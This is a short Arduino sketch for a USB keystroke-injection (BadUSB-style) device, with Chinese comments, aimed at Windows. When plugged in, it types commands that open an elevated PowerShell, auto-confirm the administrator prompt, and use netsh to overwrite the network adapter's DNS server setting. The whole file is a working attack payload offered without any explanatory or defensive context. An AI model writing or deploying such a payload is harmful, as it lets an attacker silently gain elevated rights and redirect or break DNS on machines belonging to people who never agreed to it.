void setup(){
  Keyboard.begin();
  delay(3000);
  Keyboard.press(KEY_LEFT_GUI);//win键 
  delay(500); 
  Keyboard.press('r');//r键 
  delay(500); 
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  delay(500); 
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  Keyboard.println("POWERSHELL.EXE -C START-PROCESS POWERSHELL -VERB RUNAS");
  Keyboard.println();
  delay(1000);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.print('y');
  Keyboard.release(KEY_LEFT_ALT);
  delay(500);
  Keyboard.println("CMD");
  delay(50);
  Keyboard.println("NETSH INTERFACE IP SET DNS \"lOCAL aREA cCONNECTION\" STATIC 127.0.0.1-192.168.1.1&&EXIT");
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  Keyboard.end();
}

void loop(){
}
